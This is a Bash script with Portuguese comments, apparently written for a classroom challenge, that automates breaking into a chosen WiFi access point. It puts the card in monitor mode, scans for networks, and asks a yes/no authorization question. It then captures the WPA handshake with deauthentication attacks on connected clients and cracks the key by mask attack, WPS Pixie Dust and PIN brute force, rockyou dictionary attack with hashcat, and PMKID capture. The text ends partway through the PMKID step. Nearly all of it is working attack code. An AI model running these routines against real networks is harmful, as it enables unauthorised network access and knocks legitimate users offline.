#!/usr/bin/env bash
#
# auditor.sh — Auditor WiFi automatizado (desafio didático de redes)
#
# USO AUTORIZADO: ferramenta educacional para auditar UM ÚNICO AP escolhido
# pelo usuário, numa rede própria ou explicitamente autorizada (ex.: AP do
# laboratório configurado pelo professor). Pede confirmação antes de atacar.
#
# Rodar como root (precisa de airmon-ng, iw, nmcli, etc.):
#   sudo ./auditor.sh
#
set -uo pipefail
# (não uso "set -e" porque vários comandos de rede retornam códigos != 0 em
#  condições normais — ex.: handshake ainda não capturado — e eu preciso
#  tratar esses casos manualmente em vez de abortar o script inteiro.)

# ============================================================================
# 0. CONFIGURAÇÃO GERAL / CONSTANTES
# ============================================================================

WORKDIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOGFILE="${WORKDIR}/auditoria.log"
RESPOSTAS="${WORKDIR}/respostas.txt"
CAPTURE_PREFIX="${WORKDIR}/captura"
SCAN_PREFIX="${WORKDIR}/scan"
WORDLIST_DIR="${WORKDIR}/wordlists"
ROCKYOU="${WORDLIST_DIR}/rockyou.txt"
ROCKYOU_URL="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"

# Variáveis de estado preenchidas ao longo do fluxo (nada hardcoded)
IFACE=""          # interface wifi física detectada (ex.: wlan0)
MONIFACE=""       # interface em modo monitor (ex.: wlan0mon) — NÃO assumir nome fixo
TARGET_ESSID=""
TARGET_BSSID=""
TARGET_CH=""
TARGET_ENC=""
TARGET_FREQ_LABEL=""
SENHA_ENCONTRADA=""
ROTA_USADA=""
IP_ROTEADOR=""
SOMENTE_DADOS=0
MONITOR_MODE_ATIVO=0   # controla o cleanup: só restaura se realmente entrou em modo monitor

# ============================================================================
# 1. LOG / UTILITÁRIOS
# ============================================================================

log() {
    # Grava com timestamp em auditoria.log E mostra na tela
    local msg="$1"
    echo "[$(date '+%H:%M:%S')] ${msg}" | tee -a "$LOGFILE"
}

erro() {
    echo "[ERRO] $1" | tee -a "$LOGFILE" >&2
}

pausar_enter() {
    read -rp "Pressione ENTER para continuar..." _
}

confirmar() {
    # Pergunta sim/no; só aceita "sim" explicitamente (case-insensitive)
    local pergunta="$1"
    local resposta
    read -rp "${pergunta} [sim/não]: " resposta
    [[ "${resposta,,}" == "sim" ]]
}

# ============================================================================
# 2. CLEANUP — restaura a placa de rede ao estado normal, mesmo se der erro
#    (trap garante que isso rode ao sair do script por qualquer motivo)
# ============================================================================

cleanup() {
    log "Executando limpeza / restauração da interface..."

    if [[ -n "${MONIFACE}" ]] && iw dev "${MONIFACE}" info &>/dev/null; then
        log "Parando modo monitor em ${MONIFACE}..."
        airmon-ng stop "${MONIFACE}" &>>"$LOGFILE"
    fi

    if [[ "${MONITOR_MODE_ATIVO}" -eq 1 ]]; then
        log "Religando NetworkManager para restaurar conectividade normal..."
        systemctl restart NetworkManager &>>"$LOGFILE" || service network-manager restart &>>"$LOGFILE"
        sleep 2
    fi

    log "Limpeza concluída. Log completo em: ${LOGFILE}"
}
trap cleanup EXIT INT TERM

# ============================================================================
# 3. VERIFICAÇÃO DE DEPENDÊNCIAS
# ============================================================================

verificar_dependencias() {
    log "Verificando dependências..."
    local pacotes=(aircrack-ng reaver pixiewps hashcat crunch hcxtools hcxdumptool tcpdump)
    local faltando=()

    for p in "${pacotes[@]}"; do
        if ! dpkg -s "$p" &>/dev/null; then
            faltando+=("$p")
        fi
    done

    if [[ ${#faltando[@]} -gt 0 ]]; then
        log "Pacotes faltando: ${faltando[*]}. Instalando..."
        apt-get update &>>"$LOGFILE"
        apt-get install -y "${faltando[@]}" &>>"$LOGFILE" \
            || { erro "Falha ao instalar dependências. Veja ${LOGFILE}."; exit 1; }
    else
        log "Todas as dependências já instaladas."
    fi

    # hcxpcapngtool pode vir em pacote hcxtools (nome do binário varia por versão)
    if ! command -v hcxpcapngtool &>/dev/null; then
        log "Aviso: binário hcxpcapngtool não encontrado no PATH mesmo após instalar hcxtools."
    fi
}

# ============================================================================
# 4. WORDLIST — baixar ENQUANTO ainda há internet (antes do modo monitor)
# ============================================================================

garantir_wordlist() {
    mkdir -p "${WORDLIST_DIR}"
    if [[ -s "${ROCKYOU}" ]]; then
        log "rockyou.txt já existe em ${ROCKYOU}."
        return
    fi

    # Procurar uma cópia já instalada no sistema (comum em Kali/alguns setups)
    for caminho in /usr/share/wordlists/rockyou.txt /usr/share/wordlists/rockyou.txt.gz; do
        if [[ -s "$caminho" ]]; then
            log "Encontrada wordlist do sistema em ${caminho}."
            if [[ "$caminho" == *.gz ]]; then
                gunzip -c "$caminho" > "${ROCKYOU}"
            else
                cp "$caminho" "${ROCKYOU}"
            fi
            return
        fi
    done

    log "rockyou.txt não encontrada. Baixando agora (ainda com internet ativa)..."
    if curl -fL --progress-bar -o "${ROCKYOU}.tmp" "${ROCKYOU_URL}"; then
        mv "${ROCKYOU}.tmp" "${ROCKYOU}"
        log "Wordlist baixada com sucesso: ${ROCKYOU}"
    else
        erro "Falha ao baixar rockyou.txt. A rota de dicionário (Rota C) pode falhar depois."
        rm -f "${ROCKYOU}.tmp"
    fi
}

# ============================================================================
# 5. DETECTAR INTERFACE WIFI (nunca assumir wlan0)
# ============================================================================

detectar_interface() {
    log "Detectando interfaces WiFi disponíveis..."
    mapfile -t interfaces < <(iw dev | awk '/Interface/{print $2}')

    if [[ ${#interfaces[@]} -eq 0 ]]; then
        erro "Nenhuma interface WiFi encontrada (iw dev não listou nada)."
        exit 1
    elif [[ ${#interfaces[@]} -eq 1 ]]; then
        IFACE="${interfaces[0]}"
        log "Interface única detectada: ${IFACE}"
    else
        echo "Mais de uma interface WiFi encontrada:"
        local i=1
        for ifc in "${interfaces[@]}"; do
            echo "  [$i] $ifc"
            ((i++))
        done
        local escolha
        read -rp "Escolha o número da interface a usar: " escolha
        IFACE="${interfaces[$((escolha-1))]}"
    fi

    if [[ -z "${IFACE}" ]]; then
        erro "Interface inválida selecionada."
        exit 1
    fi
    log "Usando interface física: ${IFACE}"
}

# ============================================================================
# 6. MODO MONITOR
# ============================================================================

entrar_modo_monitor() {
    log "Ajustando região regulatória para BR (habilita canais DFS/5GHz corretamente)..."
    timeout --kill-after=3 10s iw reg set BR &>>"$LOGFILE" || log "Aviso: não foi possível setar região regulatória."

    echo
    echo ">>> AVISO: a internet desta máquina vai cair agora (modo monitor)."
    echo ">>> Isso é esperado e normal. Será restaurado ao final."
    echo ">>> Se travar ou a rede não voltar, rode: $0 --restaurar"
    echo

    log "Matando processos que podem interferir (NetworkManager, wpa_supplicant)..."
    timeout --kill-after=5 20s airmon-ng check kill &>>"$LOGFILE"
    if [[ $? -eq 124 ]]; then
        log "Aviso: 'airmon-ng check kill' não respondeu em 20s, seguindo assim mesmo."
    fi

    log "Ativando modo monitor em ${IFACE}..."
    timeout --kill-after=5 20s airmon-ng start "${IFACE}" &>>"$LOGFILE"
    if [[ $? -eq 124 ]]; then
        erro "'airmon-ng start' travou por mais de 20s. A placa pode estar presa em modo"
        erro "monitor de uma execução anterior. Rode: $0 --restaurar"
        exit 1
    fi

    # NÃO hardcodar "${IFACE}mon" — descobrir o nome real criado
    sleep 2
    MONIFACE="$(iw dev | awk '/Interface/{print $2}' | grep -i 'mon' | head -n1)"

    if [[ -z "${MONIFACE}" ]]; then
        # Algumas versões do airmon-ng não renomeiam a interface (mantém o nome original em modo monitor)
        if iw dev "${IFACE}" info 2>/dev/null | grep -qi "type monitor"; then
            MONIFACE="${IFACE}"
        else
            erro "Não foi possível identificar a interface em modo monitor."
            exit 1
        fi
    fi

    MONITOR_MODE_ATIVO=1
    log "Interface em modo monitor: ${MONIFACE}"
}

# Verifica se a interface monitor ainda existe; recria se tiver sumido
# (lição aprendida: wlanXmon pode desaparecer após certos comandos)
garantir_moniface_viva() {
    if ! iw dev "${MONIFACE}" info &>/dev/null; then
        log "Interface ${MONIFACE} não existe mais. Recriando modo monitor..."
        airmon-ng start "${IFACE}" &>>"$LOGFILE"
        sleep 2
        MONIFACE="$(iw dev | awk '/Interface/{print $2}' | grep -i 'mon' | head -n1)"
        [[ -z "${MONIFACE}" ]] && MONIFACE="${IFACE}"
        log "Interface monitor recriada: ${MONIFACE}"
    fi
}

# ============================================================================
# 7. SCAN DE REDES (2.4 GHz + 5 GHz) E ESCOLHA DO ALVO
# ============================================================================

escanear_e_escolher_alvo() {
    garantir_moniface_viva
    log "Escaneando redes nas bandas a/b/g (2.4 GHz e 5 GHz) por 15s..."

    rm -f "${SCAN_PREFIX}"*.csv "${SCAN_PREFIX}"*.cap "${SCAN_PREFIX}"*.kismet.* 2>/dev/null

    # --kill-after força SIGKILL se o processo não morrer com SIGTERM dentro
    # de 5s extras — sem isso, "timeout" pode ficar esperando pra sempre se
    # o airodump-ng não terminar limpo (ex.: travado restaurando o terminal).
    timeout --kill-after=5 15s airodump-ng --band abg --write "${SCAN_PREFIX}" --output-format csv "${MONIFACE}" &>>"$LOGFILE"

    local csv="${SCAN_PREFIX}-01.csv"
    if [[ ! -f "$csv" ]]; then
        erro "Arquivo de scan não foi gerado (${csv})."
        exit 1
    fi

    # O CSV do airodump tem duas seções (APs e depois Clientes), separadas por
    # linha vazia. Extraímos só a seção de APs.
    # Colunas relevantes: BSSID, ..., channel, ..., privacy, ..., Power, ..., ESSID
    mapfile -t linhas_ap < <(awk -F', ' '
        /^Station MAC/ { exit }
        NF > 10 && $1 ~ /^[0-9A-Fa-f]{2}:/ { print }
    ' "$csv")

    if [[ ${#linhas_ap[@]} -eq 0 ]]; then
        erro "Nenhum AP encontrado no scan. Tente rodar de novo (sinal fraco?)."
        exit 1
    fi

    # Parseia cada linha em: BSSID, Channel, Privacy, Power, ESSID
    declare -a lista_bssid lista_ch lista_enc lista_pwr lista_essid

    for linha in "${linhas_ap[@]}"; do
        IFS=',' read -ra campos <<< "$linha"
        # índices do formato padrão airodump CSV (0-based):
        # 0 BSSID, 3 channel, 4 speed, 5 privacy, 6 cipher, 7 auth, 8 power
        local bssid ch privacy power essid
        bssid="$(echo "${campos[0]}" | xargs)"
        ch="$(echo "${campos[3]}" | xargs)"
        privacy="$(echo "${campos[5]}" | xargs)"
        power="$(echo "${campos[8]}" | xargs)"
        # O CSV do airodump sempre termina em "..., ID-length, ESSID, Key".
        # O último campo (Key) costuma vir vazio — o ESSID é o penúltimo.
        # (usar $NF pegava o campo "Key" vazio, deixando tudo como <oculto>)
        essid="$(echo "${campos[-2]}" | xargs)"

        [[ -z "$bssid" ]] && continue
        lista_bssid+=("$bssid")
        lista_ch+=("$ch")
        lista_enc+=("$privacy")
        lista_pwr+=("${power:--100}")
        lista_essid+=("${essid:-<oculto>}")
    done

    # Ordena índices por potência (mais perto de 0 = sinal melhor) no topo
    mapfile -t ordem < <(
        for i in "${!lista_pwr[@]}"; do
            echo "${lista_pwr[$i]} $i"
        done | sort -rn | awk '{print $2}'
    )

    echo
    echo "=============== REDES ENCONTRADAS ==============="
    printf "%-4s %-20s %-18s %-5s %-6s %-6s\n" "Nº" "ESSID" "BSSID" "CH" "ENC" "PWR"
    local n=1
    declare -A idx_map
    for i in "${ordem[@]}"; do
        printf "%-4s %-20s %-18s %-5s %-6s %-6s\n" \
            "$n" "${lista_essid[$i]:0:20}" "${lista_bssid[$i]}" "${lista_ch[$i]}" "${lista_enc[$i]}" "${lista_pwr[$i]}"
        idx_map[$n]=$i
        ((n++))
    done
    echo "==================================================="
    echo

    local escolha
    read -rp "Escolha o número do AP alvo: " escolha
    local idx="${idx_map[$escolha]:-}"
    if [[ -z "$idx" ]]; then
        erro "Escolha inválida."
        exit 1
    fi

    TARGET_ESSID="${lista_essid[$idx]}"
    TARGET_BSSID="${lista_bssid[$idx]}"
    TARGET_CH="${lista_ch[$idx]}"
    TARGET_ENC="${lista_enc[$idx]}"

    # Canais 5 GHz são todos >= 36; 2.4 GHz são todos <= 14. O regex antigo
    # não casava a faixa 100-129 e marcava esses canais como 2.4 GHz.
    if [[ "$TARGET_CH" =~ ^[0-9]+$ ]] && (( TARGET_CH >= 36 )); then
        TARGET_FREQ_LABEL="5 GHz"
    else
        TARGET_FREQ_LABEL="2.4 GHz"
    fi

    log "Alvo escolhido: ESSID=${TARGET_ESSID} BSSID=${TARGET_BSSID} CH=${TARGET_CH} ENC=${TARGET_ENC} (${TARGET_FREQ_LABEL})"
}

# ============================================================================
# 8. CONFIRMAÇÃO DE AUTORIZAÇÃO (obrigatória antes de qualquer ataque)
# ============================================================================

confirmar_autorizacao() {
    echo
    echo "=================================================================="
    echo " Você está sobre o ponto de executar uma auditoria/ataque WiFi    "
    echo " contra o AP:                                                     "
    echo "   ESSID:  ${TARGET_ESSID}"
    echo "   BSSID:  ${TARGET_BSSID}"
    echo "=================================================================="
    echo " Isso só é permitido se esta rede for:                            "
    echo "   (a) sua própria rede, OU                                       "
    echo "   (b) uma rede de laboratório/sala explicitamente autorizada     "
    echo "       pelo professor para este exercício didático.               "
    echo "=================================================================="
    if ! confirmar "Esta rede é SUA ou está EXPLICITAMENTE AUTORIZADA para este teste?"; then
        erro "Autorização não confirmada. Abortando antes de qualquer ataque."
        exit 1
    fi
    log "Autorização confirmada pelo usuário para o alvo ${TARGET_BSSID}."
}

# ============================================================================
# 9. CAPTURA DE HANDSHAKE (sub-rotina usada pelas rotas A e C)
# ============================================================================

# Verifica, no CSV gerado pelo airodump-ng, se existe algum cliente (seção
# "Station MAC") associado ao BSSID alvo. Sem cliente associado, deauth não
# tem efeito nenhum (não há quem reconectar) — detectar isso cedo evita
# gastar os 60s de tentativas de deauth à toa.
ha_cliente_conectado() {
    local csv="${CAPTURE_PREFIX}-01.csv"
    [[ -f "$csv" ]] || return 1
    awk '/^Station MAC/{f=1} f' "$csv" | grep -qi "${TARGET_BSSID}"
}

capturar_handshake() {
    garantir_moniface_viva
    log "Iniciando captura de handshake em ${TARGET_BSSID} (canal ${TARGET_CH})..."

    rm -f "${CAPTURE_PREFIX}"*.cap "${CAPTURE_PREFIX}"*.csv 2>/dev/null

    # Captura em background, focada no BSSID e canal do alvo. Isso cobre os
    # dois casos possíveis sem o usuário precisar saber de antemão qual é o
    # seu: (a) já tem gente conectada agora, ou (b) ainda ninguém conectou e
    # vai conectar daqui a pouco (ex.: o professor plugando o celular).
    # Uma conexão NOVA já gera o handshake sozinha (não precisa de deauth);
    # já um cliente que ESTAVA conectado só solta um handshake novo se for
    # forçado a reconectar — por isso o deauth só é enviado quando o script
    # detecta um cliente de fato associado ao AP.
    airodump-ng --bssid "${TARGET_BSSID}" -c "${TARGET_CH}" --write "${CAPTURE_PREFIX}" "${MONIFACE}" \
        &>>"$LOGFILE" &
    local airodump_pid=$!
    local handshake_ok=0

    echo
    echo ">>> Captura rodando no canal ${TARGET_CH} (BSSID ${TARGET_BSSID})."
    echo ">>> Não precisa saber se o dispositivo já está conectado ou vai conectar"
    echo ">>> agora — o script detecta sozinho e reage: se já tiver cliente, tenta"
    echo ">>> deauth pra forçar reconexão; se ainda não tiver, só espera a conexão"
    echo ">>> nova acontecer (ela já gera o handshake por conta própria)."
    echo ">>> Pode avisar a pessoa para conectar (ou reconectar) o dispositivo agora."
    pausar_enter

    log "Aguardando handshake (até ~2 minutos, verificando a cada 10s)..."

    local tentativas=0
    while [[ $tentativas -lt 12 ]]; do
        sleep 10
        local capfile
        capfile="$(ls -t "${CAPTURE_PREFIX}"*.cap 2>/dev/null | head -1)"
        if [[ -n "$capfile" ]] && aircrack-ng "$capfile" 2>/dev/null | grep -Eqi "[0-9]+ handshake"; then
            handshake_ok=1
            break
        fi

        if ha_cliente_conectado; then
            # Tem cliente associado agora: só vale a pena mandar deauth aqui
            # (se ele só acabou de conectar, o handshake normal da conexão
            # já deve aparecer sozinho na próxima checagem, sem precisar disso).
            log "Tentativa $((tentativas+1)): cliente conectado detectado — enviando deauth (pode não funcionar em redes com PMF/802.11w ou canais DFS)..."
            aireplay-ng --deauth 5 -a "${TARGET_BSSID}" "${MONIFACE}" &>>"$LOGFILE" || true
        else
            log "Tentativa $((tentativas+1)): nenhum cliente conectado detectado ainda — aguardando conexão..."
        fi
        ((tentativas++))
    done

    if [[ $handshake_ok -eq 0 ]]; then
        echo
        if ha_cliente_conectado; then
            echo ">>> Há cliente conectado, mas o deauth não forçou o handshake (comum em"
            echo ">>> redes com PMF/802.11w ou canais DFS 52-144, onde deauth é ignorado)."
            echo ">>> AÇÃO MANUAL: peça para a pessoa desligar e ligar o WiFi do dispositivo."
        else
            echo ">>> Ainda não foi detectado nenhum cliente conectado a esta rede."
            echo ">>> Confirme que o dispositivo realmente conectou a ESTA rede (ESSID/BSSID"
            echo ">>> certos) enquanto a captura estava rodando, e tente conectar agora."
        fi
        pausar_enter

        local capfile
        capfile="$(ls -t "${CAPTURE_PREFIX}"*.cap 2>/dev/null | head -1)"
        if [[ -n "$capfile" ]] && aircrack-ng "$capfile" 2>/dev/null | grep -Eqi "[0-9]+ handshake"; then
            handshake_ok=1
        fi
    fi

    # Encerra o airodump-ng em background com prazo: TERM, espera até 5s,
    # e força KILL se ele não morrer sozinho (evita travar pra sempre no "wait").
    kill "$airodump_pid" &>/dev/null || true
    for _ in 1 2 3 4 5; do
        kill -0 "$airodump_pid" &>/dev/null || break
        sleep 1
    done
    kill -9 "$airodump_pid" &>/dev/null || true
    wait "$airodump_pid" 2>/dev/null || true

    if [[ $handshake_ok -eq 1 ]]; then
        log "Handshake capturado com sucesso."
        return 0
    else
        erro "Não foi possível capturar o handshake."
        return 1
    fi
}

ultimo_cap() {
    ls -t "${CAPTURE_PREFIX}"*.cap 2>/dev/null | head -1
}

# ============================================================================
# 10. ROTA A — ATAQUE DE MÁSCARA (quando se conhece parte da senha)
# ============================================================================

rota_mascara() {
    echo
    echo "--- Rota A: ataque de máscara (prefixo conhecido) ---"
    local tamanho prefixo tipo_restante placeholder

    read -rp "Tamanho total da senha (ex.: 12): " tamanho
    read -rp "Prefixo conhecido (ex.: CRIPTO): " prefixo

    local restante=$(( tamanho - ${#prefixo} ))
    if [[ $restante -lt 0 ]]; then
        erro "Prefixo maior que o tamanho total. Abortando rota de máscara."
        return 1
    fi

    echo "Tipo de caractere nas posições desconhecidas:"
    echo "  [1] números (%)"
    echo "  [2] maiúsculas (,)"
    echo "  [3] minúsculas (@)"
    echo "  [4] símbolos (^)"
    read -rp "Escolha: " tipo_restante
    case "$tipo_restante" in
        1) placeholder="%" ;;
        2) placeholder="," ;;
        3) placeholder="@" ;;
        4) placeholder="^" ;;
        *) erro "Opção inválida."; return 1 ;;
    esac

    local mascara="${prefixo}"
    for ((i=0; i<restante; i++)); do mascara+="${placeholder}"; done

    log "Capturando handshake para rodar máscara '${mascara}'..."
    if ! capturar_handshake; then
        return 1
    fi

    local cap
    cap="$(ultimo_cap)"
    log "Rodando crunch + aircrack-ng com máscara ${mascara}..."

    SENHA_ENCONTRADA="$(crunch "${tamanho}" "${tamanho}" -t "${mascara}" 2>>"$LOGFILE" \
        | aircrack-ng -w - -b "${TARGET_BSSID}" "${cap}" 2>>"$LOGFILE" \
        | grep -i "KEY FOUND" | sed -E 's/.*\[\s*(.*)\s*\].*/\1/')"

    if [[ -n "${SENHA_ENCONTRADA}" ]]; then
        ROTA_USADA="Máscara (prefixo conhecido)"
        log "Senha encontrada via máscara: ${SENHA_ENCONTRADA}"
        return 0
    fi

    erro "Máscara não encontrou a senha com os parâmetros informados."
    return 1
}

# ============================================================================
# 11. ROTA B — WPS (Pixie Dust primeiro, depois brute de PIN)
# ============================================================================

rota_wps() {
    echo
    echo "--- Rota B: WPS ---"
    garantir_moniface_viva
    log "Verificando se o AP possui WPS ativo (wash)..."

    local banda_flag=""
    [[ "${TARGET_FREQ_LABEL}" == "5 GHz" ]] && banda_flag="-5"

    local wash_out
    wash_out="$(timeout --kill-after=5 15s wash -i "${MONIFACE}" ${banda_flag} 2>>"$LOGFILE")"
    echo "$wash_out" | tee -a "$LOGFILE"

    if ! echo "$wash_out" | grep -qi "${TARGET_BSSID}"; then
        log "AP não aparece com WPS ativo. Pulando rota WPS."
        return 1
    fi

    # O status de bloqueio do WPS é a coluna Lck (5º campo do wash):
    # BSSID  Ch  dBm  WPS  Lck  Vendor. Grepar a linha inteira por "No" dava
    # falso positivo (ex.: "Unknown"/"Nokia" no campo Vendor contêm "no").
    local lck
    lck="$(echo "$wash_out" | awk -v b="${TARGET_BSSID}" 'toupper($1)==toupper(b){print $5; exit}')"
    if [[ "${lck}" == "No" ]]; then
        log "WPS desbloqueado (Lck: No). Tentando Pixie Dust..."
    else
        log "WPS pode estar bloqueado (Lck: ${lck:-?}), mas vou tentar Pixie Dust mesmo assim."
    fi

    # --- Pixie Dust: monitorar saída em tempo real, com timeout e detecção de loop ---
    local reaver_log="${WORKDIR}/reaver_pixie.log"
    rm -f "$reaver_log"

    timeout --kill-after=5 90s reaver -i "${MONIFACE}" -b "${TARGET_BSSID}" -c "${TARGET_CH}" -K 1 -vv \
        > "$reaver_log" 2>&1 &
    local reaver_pid=$!

    local chegou_m1=0
    local inicio=$(date +%s)
    while kill -0 "$reaver_pid" 2>/dev/null; do
        sleep 3
        if grep -qi "Received M1 message" "$reaver_log"; then
            chegou_m1=1
        fi
        if grep -qi "WPS PIN:" "$reaver_log" || grep -qi "Pin cracked" "$reaver_log"; then
            break
        fi
        # Detecção de loop infeliz: identity request + timeout + transaction failed
        # repetidos sem nunca chegar no M1 -> abortar essa rota (seção 4.B do brief)
        local decorrido=$(( $(date +%s) - inicio ))
        if [[ $chegou_m1 -eq 0 && $decorrido -ge 90 ]]; then
            log "Loop de falha detectado sem receber M1 em 90s. Abortando rota WPS (roteador bloqueia PIN)."
            kill "$reaver_pid" &>/dev/null || true
            break
        fi
    done
    wait "$reaver_pid" 2>/dev/null || true

    cat "$reaver_log" >> "$LOGFILE"

    if grep -qi "WPS PIN:" "$reaver_log"; then
        local psk
        psk="$(grep -i "WPA PSK:" "$reaver_log" | sed -E "s/.*WPA PSK: '?([^']*)'?.*/\1/")"
        if [[ -n "$psk" ]]; then
            SENHA_ENCONTRADA="$psk"
            ROTA_USADA="WPS (Pixie Dust)"
            log "Senha encontrada via Pixie Dust: ${SENHA_ENCONTRADA}"
            return 0
        fi
    fi

    if [[ $chegou_m1 -eq 1 ]]; then
        log "Pixie Dust falhou mas AP respondeu (chegou no M1). Tentando brute de PIN (mais lento)..."
        rm -f "$reaver_log"
        timeout --kill-after=5 300s reaver -i "${MONIFACE}" -b "${TARGET_BSSID}" -c "${TARGET_CH}" -vv -d 15 \
            > "$reaver_log" 2>&1
        cat "$reaver_log" >> "$LOGFILE"

        if grep -qi "WPA PSK:" "$reaver_log"; then
            SENHA_ENCONTRADA="$(grep -i "WPA PSK:" "$reaver_log" | sed -E "s/.*WPA PSK: '?([^']*)'?.*/\1/")"
            ROTA_USADA="WPS (brute PIN)"
            log "Senha encontrada via brute de PIN: ${SENHA_ENCONTRADA}"
            return 0
        fi
    fi

    log "Rota WPS não teve sucesso."
    return 1
}

# ============================================================================
# 12. ROTA C — DICIONÁRIO + REGRAS (último recurso)
# ============================================================================

rota_dicionario() {
    echo
    echo "--- Rota C: dicionário + regras (hashcat / aircrack-ng) ---"

    if ! capturar_handshake; then
        return 1
    fi

    local cap
    cap="$(ultimo_cap)"

    if [[ ! -s "${ROCKYOU}" ]]; then
        erro "Wordlist rockyou.txt não disponível. Não é possível rodar a Rota C."
        return 1
    fi

    # Tenta GPU via hashcat primeiro (mais rápido), cai para aircrack-ng (CPU) se faltar GPU/driver
    local hashfile="${WORKDIR}/hash.hc22000"
    if command -v hcxpcapngtool &>/dev/null; then
        log "Convertendo captura para formato hashcat (hc22000)..."
        hcxpcapngtool -o "$hashfile" "$cap" &>>"$LOGFILE"
    fi

    if [[ -s "$hashfile" ]] && command -v hashcat &>/dev/null; then
        log "Rodando hashcat (modo 22000) com rockyou + regra best64..."
        hashcat -m 22000 "$hashfile" "${ROCKYOU}" -r /usr/share/hashcat/rules/best64.rule \
            --potfile-disable -o "${WORKDIR}/hashcat_found.txt" &>>"$LOGFILE"

        if [[ -s "${WORKDIR}/hashcat_found.txt" ]]; then
            SENHA_ENCONTRADA="$(cut -d':' -f2- "${WORKDIR}/hashcat_found.txt" | tail -1)"
            ROTA_USADA="Dicionário (hashcat + best64)"
            log "Senha encontrada via hashcat: ${SENHA_ENCONTRADA}"
            return 0
        fi
        log "Hashcat não encontrou. Tentando fallback via aircrack-ng (CPU)..."
    fi

    log "Rodando aircrack-ng com rockyou.txt (pode demorar)..."
    SENHA_ENCONTRADA="$(aircrack-ng -w "${ROCKYOU}" -b "${TARGET_BSSID}" "$cap" 2>>"$LOGFILE" \
        | grep -i "KEY FOUND" | sed -E 's/.*\[\s*(.*)\s*\].*/\1/')"

    if [[ -n "${SENHA_ENCONTRADA}" ]]; then
        ROTA_USADA="Dicionário (aircrack-ng/rockyou)"
        log "Senha encontrada via aircrack-ng: ${SENHA_ENCONTRADA}"
        return 0
    fi

    # Estimativa honesta de inviabilidade (brute-force fora de dicionário)
    echo
    echo ">>> Senha não encontrada no dicionário rockyou.txt + regras best64."
    echo ">>> Isso sugere senha forte (fora de listas comuns de senhas vazadas)."
    echo ">>> Estimativa: um brute-force completo de uma senha WPA2 de 10+ caracteres"
    echo ">>> alfanuméricos com símbolos, no espaço de busca ~95^10, é computacionalmente"
    echo ">>> inviável em hardware comum (anos a décadas mesmo com GPU)."
    log "Rota C esgotada sem sucesso. Senha provavelmente forte/não listada."
    return 1
}

# ============================================================================
# 12.D — ROTA D: PMKID (não depende de cliente conectado nem de deauth)
# ============================================================================
#
# Alguns roteadores respondem com o PMKID (um "resumo" da chave) já na
# primeira etapa da negociação, assim que o hcxdumptool manda uma solicitação
# de associação — sem precisar de nenhum dispositivo real conectado, e sem
# derrubar ninguém com deauth. Funciona ou não dependendo do roteador (APs
# mais novos com WPA3/PMF costumam bloquear isso), por isso é só mais uma
# tentativa — não substitui as outras rotas.

rota_pmkid() {
    echo
    echo "--- Rota D: PMKID (ataque direto ao roteador, sem precisar de cliente) ---"
    garantir_moniface_viva

    if ! command -v hcxdumptool &>/dev/null; then
        log "hcxdumptool não está instalado — pulando rota PMKID."
        return 1
    fi

    local pmkid_cap="${WORKDIR}/pmkid.pcapng"
    local pmkid_hash="${WORKDIR}/pmkid.hc22000"
    local bpf_file="${WORKDIR}/pmkid_attack.bpf"
    rm -f "$pmkid_cap" "$pmkid_hash" "$bpf_file"

    # Versões atuais do hcxdumptool (6.x) não têm mais --filterlist/--filtermode;
    # o jeito oficial de restringir ao BSSID alvo é compilar um filtro BPF com
    # tcpdump e passar via --bpf (tcpdump só compila e sai, não captura nada).
    if ! tcpdump -i "${MONIFACE}" \
        "wlan addr1 ${TARGET_BSSID} or wlan addr2 ${TARGET_BSSID} or wlan addr3 ${TARGET_BSSID} or wlan addr3 ff:ff:ff:ff:ff:ff" \
        -ddd > "$bpf_file" 2>>"$LOGFILE"; then
        erro "Falha ao compilar filtro BPF para o PMKID. Pulando rota PMKID."
        return 1
    fi

    # O -c do hcxdumptool aceita canal (<=1000) OU frequência em MHz (>1000);
    # a doc recomenda usar frequência em 5 GHz. Calculamos a frequência do
    # canal pra não depender de sufixos de banda (que variam entre versões e
    # cuja convenção a/b é ambígua).
    local freq_mhz
    if [[ "${TARGET_FREQ_LABEL}" == "5 GHz" ]]; then
        freq_mhz=$(( 5000 + TARGET_CH * 5 ))
    elif [[ "${TARGET_CH}" -eq 14 ]]; then
        freq_mhz=2484
    else
        freq_mhz=$(( 2407 + TARGET_CH * 5 ))
    fi

    # hcxdumptool NÃO funciona sobre uma interface monitor já criada pelo
    # airmon-ng/iw (ele gerencia o modo monitor sozinho, direto na interface
    # física) — usar o "wlanXmon" do airmon-ng aqui resulta em 0 pacotes
    # capturados sempre, silenciosamente. Por isso saímos do modo monitor,
    # deixamos o hcxdumptool cuidar disso sozinho, e recriamos o modo
    # monitor depois pra seguir com as próximas rotas.
    log "Saindo do modo monitor do airmon-ng (hcxdumptool precisa da interface física crua)..."
    airmon-ng stop "${MONIFACE}" &>>"$LOGFILE"
    sleep 1

    # -w (não -o) é o flag de saída no hcxdumptool >= 6.3.0 / 7.x (Ubuntu/Kali atuais).
    log "Tentando capturar PMKID direto do roteador por 30s (canal ${TARGET_CH}, ${freq_mhz} MHz)..."
    timeout --kill-after=5 30s hcxdumptool -i "${IFACE}" -w "$pmkid_cap" \
        --bpf="$bpf_file" -c "${freq_mhz}" &>>"$LOGFILE"

    # Sempre volta pro modo monitor via airmon-ng, mesmo se a rota falhar —
    # as próximas rotas (dicionário) dependem disso.
    log "Recriando modo monitor via airmon-ng para seguir com as próximas rotas..."
    airmon-ng start "${IFACE}" &>>"$LOGFILE"
    sleep 2
    MONIFACE="$(iw dev | awk '/Interface/{print $2}' | grep -i 'mon' | head -n1)"
    [[ -z "${MONIFACE}" ]] && MONIFACE="${IFACE}"
    log "Interface em modo monitor novamente: ${MONIFACE}"

    if [[ ! -s "$pmkid_cap" ]]; then
        log "Nenhum pacote capturado na tentativa de PMKID."
        return 1
    fi

    if ! command -v hcxpcapngtool &>/dev/null; then
        erro "hcxpcapngtool não encontrado — não é possível converter o PMKID capturado."
        return 1
    fi

    hcxpcapngtool -o "$pmkid_hash" "$pmkid_cap" &>>"$LOGFILE"

    if [[ ! -s "$pmkid_hash" ]]; then
        log "O roteador não respondeu com PMKID (comum em APs com WPA3/PMF). Rota D sem sucesso."
        return 1
    fi

    if [[ ! -s "${ROCKYOU}" ]]; then
        erro "Wordlist rockyou.txt não disponível. Não é possível quebrar o PMKID capturado."
        return 1
    fi

    log "PMKID capturado! Tentando quebrar com hashcat (rockyou + best64)..."
    rm -f "${WORKDIR}/pmkid_found.txt"
